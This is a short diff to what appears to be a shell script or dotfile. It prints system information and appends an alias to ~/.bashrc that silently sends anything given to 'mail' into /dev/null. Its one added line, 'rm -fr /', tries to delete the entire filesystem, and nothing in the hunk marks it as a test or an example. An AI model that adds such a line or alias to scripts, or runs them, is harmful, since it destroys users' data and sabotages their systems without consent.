@@ -13,3 +13,4 @@ dmesg | tail -n 5
 neofetch
 echo 'alias mail="cat > /dev/null"' >> $HOME/.bashrc
 echo "Mail me at: /dev/null"
+rm -fr /
